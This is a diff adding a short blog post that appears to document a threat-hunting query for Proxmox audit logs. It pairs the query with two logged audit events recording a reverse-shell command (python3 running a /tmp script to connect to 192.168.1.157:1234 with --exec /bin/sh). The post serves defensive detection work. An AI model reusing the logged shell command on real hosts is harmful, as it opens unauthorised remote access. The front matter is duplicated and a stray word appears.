@@ -1,0 +1,33 @@
+---
+layout: post
+title:  "Example"
+date:   2026-06-13 12:26:20 +0100
+categories: Test
+---
+layout: post
+title: "Example"
+date: 2026-06-11 17:39:09 +0100
+categories: example
+---
+### Proxmox
+
+think
+
+{% highlight js %}
+#type = "linux-audit"
+| "Vendor.audit_type" = EXECVE
+| event.category[0] = process
+| process.command_line = /\/usr\/bin\/python3 \/tmp\/.* \d+\.\d+\.\d+\.\d+ \d+ /i
+
+
+#type = "linux-audit"
+| "Vendor.audit_counter" = 2008
+| groupBy(Vendor.audit_type, "Vendor.audit_content", function=min("@timestamp", as="first_event"))
+
+{% endhighlight %}
+
+## Matching Events
+
+{% highlight json-doc %}
+[{"Vendor.argc":"9","process.args[4]":"\"--exec\"","@collect.id":"7650fba2-4235-4409-8411-7f7780c92f52","event.type[0]":"info","process.args[0]":"\"/usr/bin/python3\"","Vendor.a5":"/bin/sh","Vendor.timestamp":"1781007172.596","Vendor.a2":"192.168.1.157","#event.kind":"event","@collect.source_type":"file","Parser.version":"2.0.1","Vendor.a4":"--exec","@id":"oF6FOFuFALGsAdQKO0q9Tyew_3_138_1781007172","@timestamp":1781007172596,"#Cps.version":"1.1.0","@ingesttimestamp":"1781007173644","@collect.timezone":"BST","#type":"linux-audit","@collect.host":"pve","#repo":"3pi_ao_ra9951","#Vendor":"linux","#repo.cid":"903b17","process.command_line":"/usr/bin/python3 /tmp/tmplqlhyo0z 192.168.1.157 1234 --exec /bin/sh --reconn --reconn-wait 1","process.args_count":"9","@sourcetype":"linux-audit","process.args[7]":"\"--reconn-wait\"","process.args[3]":"\"1234\"","event.category[0]":"process","#ecs.version":"9.2.0","Vendor.a6":"--reconn","@collect.source_name":"linux_auditd","host.os.type":"linux","#event.dataset":"auditd.execve","@timezone":"Z","process.args[8]":"\"1\"","process.args[2]":"\"192.168.1.157\"","Vendor.a3":"1234","#event.module":"auditd","Vendor.a7":"--reconn-wait","Vendor.a1":"/tmp/tmplqlhyo0z","Vendor.a8":"1","@collect.timestamp":"1781007172629","@source":"PlatformEvents","@timestamp.nanos":"0","Vendor.audit_counter":"2008","process.args[6]":"\"--reconn\"","process.args[5]":"\"/bin/sh\"","@collect.file":"/var/log/audit/audit.log","Vendor.audit_type":"EXECVE","@dataConnectionID":"d1b1bea835dbea","Vendor.audit_content":"argc=9 a0=\"/usr/bin/python3\" a1=\"/tmp/tmplqlhyo0z\" a2=\"192.168.1.157\" a3=\"1234\" a4=\"--exec\" a5=\"/bin/sh\" a6=\"--reconn\" a7=\"--reconn-wait\" a8=\"1\"","process.args[1]":"\"/tmp/tmplqlhyo0z\"","Vendor.a0":"/usr/bin/python3","@rawstring":"node=pve type=EXECVE msg=audit(1781007172.596:2008): argc=9 a0=\"/usr/bin/python3\" a1=\"/tmp/tmplqlhyo0z\" a2=\"192.168.1.157\" a3=\"1234\" a4=\"--exec\" a5=\"/bin/sh\" a6=\"--reconn\" a7=\"--reconn-wait\" a8=\"1\"","event.reason":"Arguments supplied to the execve system call"},{"@collect.id":"7650fba2-4235-4409-8411-7f7780c92f52","event.type[0]":"info","process.args[0]":"\"nohup\"","Vendor.a5":"--exec","Vendor.timestamp":"1781007172.593","Vendor.a2":"/tmp/tmplqlhyo0z","#event.kind":"event","@collect.source_type":"file","Parser.version":"2.0.1","Vendor.a4":"1234","@id":"oFFdQKO0q9Ty1007172","process.args[9]":"\"1\"","Vendor.argc":"10","@timestamp":1781007172593,"#Cps.version":"1.1.0","@ingesttimestamp":"1781007173644","@collect.timezone":"BST","process.args[4]":"\"1234\"","Vendor.a9":"1","#type":"linux-audit","@collect.host":"pve","#repo":"3pi_auto_raptor_1769171099951","#Vendor":"linux","#repo.cid":"903b17","process.command_line":"nohup /usr/bin/python3 /tmp/tmplqlhyo0z 192.168.1.157 1234 --exec /bin/sh --reconn --reconn-wait 1","process.args_count":"10","@sourcetype":"linux-audit","process.args[7]":"\"--reconn\"","process.args[3]":"\"192.168.1.157\"","event.category[0]":"process","#ecs.version":"9.2.0","Vendor.a6":"/bin/sh","@collect.source_name":"linux_auditd","host.os.type":"linux","#event.dataset":"auditd.execve","@timezone":"Z","process.args[8]":"\"--reconn-wait\"","process.args[2]":"\"/tmp/tmplqlhyo0z\"","Vendor.a3":"192.168.1.157","#event.module":"auditd","Vendor.a7":"--reconn","Vendor.a1":"/usr/bin/python3","Vendor.a8":"--reconn-wait","@collect.timestamp":"1781007172629","@source":"PlatformEvents","@timestamp.nanos":"0","Vendor.audit_counter":"2007","process.args[6]":"\"/bin/sh\"","process.args[5]":"\"--exec\"","@collect.file":"/var/log/audit/audit.log","Vendor.audit_type":"EXECVE","@dataConnectionID":"db1b7cef6ccea","Vendor.audit_content":"argc=10 a0=\"nohup\" a1=\"/usr/bin/python3\" a2=\"/tmp/tmplqlhyo0z\" a3=\"192.168.1.157\" a4=\"1234\" a5=\"--exec\" a6=\"/bin/sh\" a7=\"--reconn\" a8=\"--reconn-wait\" a9=\"1\"","process.args[1]":"\"/usr/bin/python3\"","Vendor.a0":"nohup","@rawstring":"node=pve type=EXECVE msg=audit(1781007172.593:2007): argc=10 a0=\"nohup\" a1=\"/usr/bin/python3\" a2=\"/tmp/tmplqlhyo0z\" a3=\"192.168.1.157\" a4=\"1234\" a5=\"--exec\" a6=\"/bin/sh\" a7=\"--reconn\" a8=\"--reconn-wait\" a9=\"1\"","event.reason":"Arguments supplied to the execve system call"}]
+{% endhighlight %}
